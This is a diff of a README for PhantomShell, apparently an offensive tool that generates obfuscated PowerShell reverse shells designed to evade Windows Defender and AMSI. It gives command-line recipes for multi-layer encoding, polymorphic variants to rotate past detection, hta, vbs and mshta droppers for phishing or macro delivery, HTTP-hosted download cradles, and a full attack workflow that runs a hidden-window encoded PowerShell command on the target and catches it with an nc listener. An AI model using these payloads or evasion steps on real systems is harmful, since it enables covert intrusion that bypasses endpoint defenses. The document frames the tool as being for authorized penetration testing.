@@ -18,10 +18,10 @@
 ### Advanced PowerShell AV/AMSI Evasion Framework
 
 [![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS-black?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/adrilaw/PhantomShell)
-[![Target](https://img.shields.io/badge/Target-Windows-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/adrilaw/PhantomShell)
+[![Version](https://img.shields.io/badge/Version-2.0-red?style=for-the-badge)](https://github.com/adrilaw/PhantomShell)
+[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS-black?style=for-the-badge&logo=linux)](https://github.com/adrilaw/PhantomShell)
+[![Target](https://img.shields.io/badge/Target-Windows-blue?style=for-the-badge&logo=windows)](https://github.com/adrilaw/PhantomShell)
 [![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
-[![Offensive Security](https://img.shields.io/badge/Category-Offensive%20Security-red?style=for-the-badge)](https://github.com/adrilaw/PhantomShell)
 
 > **For authorized penetration testing and red team operations only.**
 
@@ -31,121 +31,131 @@
 
 ## 👻 What is PhantomShell?
 
-**PhantomShell** is a next-generation PowerShell reverse-shell payload generator engineered to bypass Windows Defender and AMSI. It goes far beyond simple variable renaming — it combines **polymorphic obfuscation**, **multi-layer encoding**, **junk comment injection**, **keyword case randomization**, and **multiple delivery formats** to produce payloads that look different on every single run.
+PhantomShell generates obfuscated, base64-encoded PowerShell reverse shells designed to evade **signature-based** AV and AMSI detection. It automates the tedious process of renaming variables, encoding payloads across multiple layers, hiding connection details, and serving payloads over HTTP — all from a single command.
 
-Built for red teamers, CTF players, and penetration testers who need results, not excuses.
+**v2.0 is a hardened rewrite.** Earlier versions had three bugs that caused shells to not work at all: illegal backticks on .NET methods, random case mutation breaking `Out-String`, and junk comment injection corrupting base64 strings. All three are gone. The tool now includes a built-in integrity verifier and round-trip decoder that confirms every payload is valid before printing it.
+
+---
+
+## 🔍 Is it "Fully Undetectable"?
+
+**Honest answer: no tool can guarantee that — and any tool claiming otherwise is lying to you.**
+
+Here is what PhantomShell actually does and what it doesn't:
+
+| Layer | What it defeats | What it doesn't defeat |
+|---|---|---|
+| Variable renaming | Signature matching on known variable names | Behavioral/heuristic analysis |
+| utf-16le base64 encoding | Plain-text pattern matching | Runtime AMSI scanning when the payload executes |
+| Multi-layer IEX wrapping | Static analysis that only unpacks one layer | Deep sandboxing, EDR with full deobfuscation |
+| IP/port b64 hiding | Simple string search for IPs | Network-level detection, DNS monitoring |
+| Random variable names | Hash-based payload signatures | AI/ML-based behavioral detection |
+
+**Against modern Windows Defender (real-time + cloud + AMSI):** the `random` profile with `--layers 3` and `--enc-b64` provides the best chance of bypassing signature-based detection. However, once the payload executes and opens a TCP socket, behavioral detection can still flag it. PhantomShell buys you an entry point — operational security beyond that is your responsibility.
+
+**Best results in practice:**
+- Use `--layers 3` on hardened targets
+- Use `--enc-b64` to hide the IP/port
+- Use `polymorph` to rotate payloads if one gets caught
+- Pair with `server` so the payload is pulled over HTTP (reduces disk exposure)
 
 ---
 
 ## ✨ Features
 
-| Feature | Description |
-|---|---|
-| 🎭 **3 Obfuscation Profiles** | `minimal`, `aggressive`, `random` — choose your noise level |
-| 🔁 **Polymorphic Engine** | Generate N unique variants in one command, each with a different fingerprint |
-| 🧅 **Multi-Layer Encoding** | Stack 1–3 nested `utf-16le → base64 → IEX` wrappers |
-| 💬 **Junk Comment Injection** | Sprinkles random `<#noise#>` inline comments to break static signatures |
-| 🔡 **Keyword Case Mutation** | Randomizes casing on `iex`, `Write`, `Flush`, `Out-String`, and more |
-| 📦 **5 Output Formats** | `powershell`, `cmd`, `hta`, `vbs`, `mshta` |
-| 🌐 **Built-in HTTP Server** | Hosts your payload and auto-generates the download cradle |
-| 🔒 **IP/Port B64 Encoding** | Hides connection details inside the payload itself |
-| 🔍 **Payload Fingerprinting** | Every payload gets a unique MD5 fingerprint for tracking |
+| Feature | Status | Notes |
+|---|---|---|
+| 3 obfuscation profiles | ✅ Working | `minimal` `aggressive` `random` |
+| Multi-layer encoding (1-3) | ✅ Working | Each layer wraps the previous |
+| IP/port base64 hiding | ✅ Working | Connection details hidden inside payload |
+| Polymorphic variants | ✅ Working | N unique payloads, all different fingerprints |
+| 5 output formats | ✅ Working | `powershell` `cmd` `hta` `vbs` `mshta` |
+| Built-in HTTP server | ✅ Working | Auto-names file, cleans up after use |
+| Integrity verifier | ✅ Working | Validates payload before printing |
+| Round-trip verifier | ✅ Working | Decodes layers and confirms correctness |
+| Payload fingerprinting | ✅ Working | MD5 per payload for tracking |
 
 ---
 
 ## ⚙️ Installation
 
-**Requirements:** Python 3.8+ · No external dependencies (pure stdlib)
+No dependencies. Pure Python stdlib.
 
 ```bash
-# Clone the repository
 git clone https://github.com/adrilaw/PhantomShell.git
 cd PhantomShell
-
-# Make it executable
 chmod +x phantomshell.py
-
-# Verify it works
 python3 phantomshell.py --help
 ```
-
-> No pip install needed. PhantomShell uses Python's standard library only.
 
 ---
 
 ## 🚀 Quick Start
 
-### 1. Basic reverse shell payload
-
-```bash
-python3 phantomshell.py revshell -i 10.10.16.98 -p 4444
-```
-
-Copy the output, paste it into your target Windows machine. Start your listener:
-
+**Terminal 1 — start your listener:**
 ```bash
 nc -lvnp 4444
 ```
 
----
-
-## 📖 Usage
-
-### Commands Overview
-
-```
-python3 phantomshell.py <command> [options]
-
-Commands:
-  revshell     Generate a standalone obfuscated payload
-  server       Host payload over HTTP + print the download cradle
-  polymorph    Generate N unique polymorphic variants at once
+**Terminal 2 — generate payload:**
+```bash
+python3 phantomshell.py revshell -i 10.10.10.5 -p 4444
 ```
 
+Copy the red output and run it on the target Windows machine. Shell arrives in Terminal 1.
+
 ---
+
+## 📖 Command Reference
 
 ### `revshell` — Standalone Payload
 
-Generate a self-contained encoded PowerShell command, ready to execute on the target.
+Generates a single encoded command ready to paste and execute.
 
 ```bash
 python3 phantomshell.py revshell -i <IP> -p <PORT> [OPTIONS]
 ```
 
-| Flag | Description | Default |
-|---|---|---|
-| `-i, --attacker-ip` | Your IP address | *(required)* |
-| `-p, --port` | Listening port | *(required)* |
-| `-o, --obf-profile` | Obfuscation profile: `minimal` `aggressive` `random` | `aggressive` |
-| `--layers` | Encoding layers: `1` `2` `3` | `1` |
-| `--format` | Output format: `powershell` `cmd` `hta` `vbs` `mshta` | `powershell` |
-| `--enc-b64` | Base64-encode IP and port inside the payload | `false` |
-| `--keep-pwd` | Include CWD in shell prompt (may trigger AMSI) | `false` |
-| `--do-not-hide` | Omit `-NoP -sta -NonI -W Hidden` flags | `false` |
-| `-v, --verbose` | Show intermediate payloads and obfuscation details | `false` |
-| `--no-banner` | Suppress the ASCII banner | `false` |
+| Flag | Short | Description | Default |
+|---|---|---|---|
+| `--attacker-ip` | `-i` | Your IP address | required |
+| `--port` | `-p` | Listening port | required |
+| `--obf-profile` | `-o` | `minimal` / `aggressive` / `random` | `aggressive` |
+| `--layers` | `-l` | Encoding layers: `1` `2` `3` | `1` |
+| `--format` | `-f` | `powershell` `cmd` `hta` `vbs` `mshta` | `powershell` |
+| `--enc-b64` | | Hide IP and port in base64 | off |
+| `--keep-pwd` | | Show CWD in prompt (may trigger AMSI) | off |
+| `--do-not-hide` | | Omit `-NoP -sta -NonI -W Hidden` | off |
+| `--verbose` | `-v` | Show decoded payload before encoding | off |
+| `--no-banner` | | Suppress ASCII banner | off |
 
 **Examples:**
 
 ```bash
-# Aggressive obfuscation + 2 encoding layers
-python3 phantomshell.py revshell -i 10.10.16.98 -p 4444 -o aggressive --layers 2
+# Basic — aggressive profile, layer 1
+python3 phantomshell.py revshell -i 10.10.10.5 -p 4444
 
-# Random variable names + base64-encoded connection details
-python3 phantomshell.py revshell -i 10.10.16.98 -p 4444 -o random --enc-b64
+# Maximum evasion — random vars, 3 layers, hidden IP/port
+python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -o random -l 3 --enc-b64
 
-# Output as HTA dropper with 3 layers
-python3 phantomshell.py revshell -i 10.10.16.98 -p 4444 --format hta --layers 3
+# HTA dropper with 2 layers
+python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f hta -l 2
 
-# Verbose: see every transformation step
-python3 phantomshell.py revshell -i 10.10.16.98 -p 4444 -v
+# cmd.exe wrapper
+python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f cmd
+
+# See exactly what gets encoded (verbose)
+python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -v
+
+# No PS hidden-window flags (for testing)
+python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 --do-not-hide
 ```
 
 ---
 
 ### `server` — HTTP Payload Hosting
 
-Writes the obfuscated payload to disk, starts a Python HTTP server, and prints a one-liner download cradle for the target to execute.
+Writes the obfuscated `.ps1` to disk, starts a Python HTTP server, and prints a download cradle for the target to execute. The target pulls the script over HTTP and executes it — nothing touches disk on the target machine.
 
 ```bash
 python3 phantomshell.py server -i <IP> -p <PORT> [OPTIONS]
@@ -153,43 +163,45 @@ python3 phantomshell.py server -i <IP> -p <PORT> [OPTIONS]
 
 | Flag | Description | Default |
 |---|---|---|
-| `-i, --attacker-ip` | Your IP address | *(required)* |
-| `-p, --port` | Listening port for reverse shell | *(required)* |
+| `-i` | Your IP (also used as HTTP server address) | required |
+| `-p` | Reverse shell listening port | required |
 | `--server-port` | HTTP server port | `8000` |
-| `-o, --outfile` | Payload filename (random name if omitted) | *(random)* |
-| `-O, --obf-profile` | Obfuscation profile | `aggressive` |
-| `--layers` | Encoding layers | `1` |
-| `--format` | Output format | `powershell` |
-| `--enc-b64` | Base64-encode IP/port | `false` |
-| `--keep-file` | Do not delete the payload file after serving | `false` |
-| `--keep-pwd` | Include CWD in shell prompt | `false` |
-| `--do-not-hide` | Omit hidden-window flags | `false` |
-| `-v, --verbose` | Verbose output | `false` |
+| `-o, --outfile` | Payload filename on disk | random e.g. `svc_abcxyz.ps1` |
+| `--obf-profile` | `minimal` / `aggressive` / `random` | `aggressive` |
+| `-l, --layers` | Encoding layers for the cradle | `1` |
+| `-f, --format` | Output format | `powershell` |
+| `--enc-b64` | Hide IP/port in base64 | off |
+| `--keep-file` | Do not delete payload file after serving | off |
+| `--keep-pwd` | Show CWD in prompt | off |
+| `--do-not-hide` | Omit hidden-window flags | off |
+| `-v` | Verbose output | off |
 
 **Examples:**
 
 ```bash
-# Start HTTP server on default port 8000
-python3 phantomshell.py server -i 10.10.16.98 -p 4444
+# Default — serves on port 8000, random filename
+python3 phantomshell.py server -i 10.10.10.5 -p 4444
 
-# Custom HTTP port + keep the payload file after use
-python3 phantomshell.py server -i 10.10.16.98 -p 4444 --server-port 9090 --keep-file
+# Custom HTTP port + named file
+python3 phantomshell.py server -i 10.10.10.5 -p 4444 --server-port 9090 -o update.ps1
 
-# Named payload file
-python3 phantomshell.py server -i 10.10.16.98 -p 4444 -o update.ps1
+# 3 layers on the cradle + b64 IP hiding
+python3 phantomshell.py server -i 10.10.10.5 -p 4444 -l 3 --enc-b64
+
+# Keep the file after serving (for inspection)
+python3 phantomshell.py server -i 10.10.10.5 -p 4444 --keep-file
 ```
 
-On the **target machine**, execute the cradle printed by PhantomShell:
-
+**On the target — run the cradle printed by PhantomShell:**
 ```powershell
-powershell -NoP -sta -NonI -W Hidden -enc <CRADLE>
+powershell -NoP -sta -NonI -W Hidden -enc <CRADLE_FROM_OUTPUT>
 ```
 
 ---
 
 ### `polymorph` — Polymorphic Variant Generator
 
-Generate multiple unique payloads in a single command. Each variant uses a different obfuscation profile and randomized variable names — no two share the same signature.
+Generates N unique payloads in one shot. Each variant rotates through profiles and uses fresh random variable names. Every variant has a different MD5 fingerprint — useful when one payload gets caught and you need to rotate quickly.
 
 ```bash
 python3 phantomshell.py polymorph -i <IP> -p <PORT> [OPTIONS]
@@ -197,109 +209,112 @@ python3 phantomshell.py polymorph -i <IP> -p <PORT> [OPTIONS]
 
 | Flag | Description | Default |
 |---|---|---|
-| `-i, --attacker-ip` | Your IP address | *(required)* |
-| `-p, --port` | Listening port | *(required)* |
-| `-n, --count` | Number of unique variants to generate | `3` |
-| `--layers` | Encoding layers per variant | `1` |
-| `--enc-b64` | Base64-encode IP/port inside each payload | `false` |
-| `--keep-pwd` | Include CWD in shell prompt | `false` |
-| `-v, --verbose` | Verbose output | `false` |
+| `-i` | Your IP | required |
+| `-p` | Listening port | required |
+| `-n, --count` | Number of variants | `3` |
+| `-l, --layers` | Encoding layers per variant | `1` |
+| `--enc-b64` | Hide IP/port in base64 | off |
+| `--keep-pwd` | Show CWD in prompt | off |
+| `-v` | Verbose | off |
 
 **Examples:**
 
 ```bash
-# Generate 5 unique variants
-python3 phantomshell.py polymorph -i 10.10.16.98 -p 4444 -n 5
+# 5 variants, default settings
+python3 phantomshell.py polymorph -i 10.10.10.5 -p 4444 -n 5
 
-# 10 variants with 2 encoding layers each
-python3 phantomshell.py polymorph -i 10.10.16.98 -p 4444 -n 10 --layers 2
+# 10 variants, 2 layers each, hidden IP
+python3 phantomshell.py polymorph -i 10.10.10.5 -p 4444 -n 10 -l 2 --enc-b64
+
+# 3 variants with 3 layers (maximum evasion)
+python3 phantomshell.py polymorph -i 10.10.10.5 -p 4444 -n 3 -l 3
 ```
 
-Each variant is printed with its obfuscation profile and a unique fingerprint:
-
+Output example:
 ```
-── Variant 1 [aggressive] FP:CFCC983F ────────────────────
-── Variant 2 [random]     FP:B2D3A0B7 ────────────────────
-── Variant 3 [minimal]    FP:4A7F21E0 ────────────────────
+── Variant 1  profile=minimal     layers=1  FP:B0CCA4CD  ──────────
+── Variant 2  profile=aggressive  layers=1  FP:06F530B1  ──────────
+── Variant 3  profile=random      layers=1  FP:A273D56F  ──────────
 ```
 
 ---
 
-## 🎯 Obfuscation Profiles Explained
+## 🎯 Obfuscation Profiles
 
 ### `minimal`
-Basic variable renaming. Fast and clean. Good starting point.
+Simple short variable renames. Fast, readable, low footprint.
 ```
-$client → $c    $stream → $s    $bytes → $b
-$data   → $d    $sendback → $sb  $sendbyte → $sy
+$client → $c    $stream → $st    $bytes → $b
+$data → $d      $sendback → $sb  $sendback2 → $sb2  $sendbyte → $sy
 ```
 
 ### `aggressive` *(default)*
-Everything in `minimal` plus:
-- Backtick-breaks on PS keywords: `New-Object` → `` New-`Ob`ject ``
-- Random case mutation on `iex`, `Write`, `Flush`, `Out-String`, `Read`, etc.
-- Junk inline comments: `<#xKw7aM#>` injected between statements
+Medium-length obfuscated names with hex-style identifiers.
+```
+$client → $xA1   $stream → $xB2   $bytes → $xC3
+$data → $xD4     $sendback → $xE5  $sendback2 → $xE52  $sendbyte → $xF6
+```
 
 ### `random`
-Fully randomized variable names on every execution. Combined with junk comments. No two runs produce the same payload. Best for evading hash-based detection.
+Fully random variable names on every execution. No two runs produce the same payload. Best against hash/signature-based detection.
+```
+$client → $mKpRx    $stream → $zQ6v8A6    $bytes → $hySOJ  (example)
+```
 
 ---
 
 ## 🧅 Encoding Layers
 
-| Layer | What happens |
+| Layer | What it does |
 |---|---|
-| `1` | `utf-16le` → `base64` → PowerShell `-enc` *(standard)* |
-| `2` | Layer 1 wrapped in a second `IEX([Convert]::FromBase64String(...))` |
-| `3` | Layer 2 wrapped in a third `$d=...; $s=...; IEX($s)` stage |
+| `1` | `utf-16le → base64` → standard PS `-enc` flag |
+| `2` | Layer 1 blob wrapped in `IEX(FromBase64String(...))`, then encoded again |
+| `3` | Layer 2 blob wrapped in `$_b=...; $_s=...; IEX($_s)`, then encoded again |
 
-More layers = more work for AV engines to statically unpack before analysis.
+Each layer is a complete re-encoding of the previous stage. The payload is verified by decoding every layer before output — if any layer is corrupt, the tool refuses to print it.
 
 ---
 
 ## 📦 Output Formats
 
-| Format | Use case |
+| Format | How to use it |
 |---|---|
-| `powershell` | Direct PS execution — default, universal |
-| `cmd` | Wrap in `cmd /c` for batch scripts or RCE via cmd.exe |
-| `hta` | HTML Application dropper — opens with mshta.exe |
-| `vbs` | VBScript dropper — `WScript.Shell.Run` |
-| `mshta` | `mshta vbscript:` one-liner — useful in phishing / macro delivery |
+| `powershell` | Paste directly into PowerShell or a run dialog |
+| `cmd` | Use when you have cmd.exe RCE (via `cmd /c`) |
+| `hta` | Save as `.hta`, open with mshta.exe — phishing/click delivery |
+| `vbs` | Save as `.vbs`, run with wscript/cscript — macro delivery |
+| `mshta` | One-liner for `mshta vbscript:` execution |
 
 ---
 
-## 📋 Full Attack Workflow Example
+## 🧪 Full Attack Workflow
 
 ```bash
-# Terminal 1 — start listener
+# Terminal 1 — listener
 nc -lvnp 4444
 
-# Terminal 2 — generate + host payload
-python3 phantomshell.py server -i 10.10.16.98 -p 4444 --server-port 8080 -O random --layers 2
+# Terminal 2 — host payload + print cradle
+python3 phantomshell.py server -i 10.10.10.5 -p 4444 -o svc_update.ps1 -l 2 -o random
+
+# [On target Windows machine — paste the red output from PhantomShell]
+powershell -NoP -sta -NonI -W Hidden -enc <OUTPUT>
+
+# Shell lands in Terminal 1
 ```
-
-PhantomShell prints a cradle. On the **target** (Windows):
-
-```powershell
-powershell -NoP -sta -NonI -W Hidden -enc <PRINTED_CRADLE>
-```
-
-Shell lands in Terminal 1. 🎯
 
 ---
 
 ## ⚠️ Legal Disclaimer
 
-> **PhantomShell is intended exclusively for:**
-> - Authorized penetration testing engagements
-> - CTF (Capture The Flag) competitions  
-> - Red team operations with explicit written permission
-> - Security research in controlled lab environments
->
-> **Using this tool against systems you do not own or have explicit written authorization to test is illegal and unethical.** The author assumes no liability for misuse. You are solely responsible for your actions.
->
-> **Always get written authorization before testing.**
+PhantomShell is intended **exclusively** for:
+- Authorized penetration testing engagements
+- CTF (Capture The Flag) competitions
+- Red team operations with explicit written permission
+- Security research in isolated lab environments
+
+**Using this tool against systems you do not own or have explicit written authorization to test is illegal.** The author assumes zero liability for misuse. You are solely responsible for your actions and compliance with applicable laws.
+
+**Always get written authorization before testing.**
 
 ---
 
@@ -333,16 +348,16 @@ THE SOFTWARE.
 
 ## 🙏 Credits
 
-- Original Nishang one-liner by [samratashok](https://github.com/samratashok/nishang)
-- PhantomShell enhancements and framework by [adrilaw](https://github.com/Adrilaw)
-- Inspired by the original [BypassAMSI_PSRevshell](https://github.com/gunzf0x/BypassAMSI_PSRevshell) by gunzf0x
+- Original Nishang TCP reverse shell by [samratashok](https://github.com/samratashok/nishang)
+- PhantomShell by [adrilaw](https://github.com/adrilaw)
+- Inspired by [BypassAMSI_PSRevshell](https://github.com/gunzf0x/BypassAMSI_PSRevshell) by gunzf0x
 
 ---
 
 <div align="center">
 
-**Made with 🖤 by [Adrilaw/Kidpentester](https://github.com/adrilaw)**
+**Made with 🖤 by [Adrilaw/Kidpentester](https://github.com/Adrilaw)**
 
-*If this helped you pop a shell, drop a ⭐*
+*Drop a ⭐ if it popped a shell*
 
 </div>
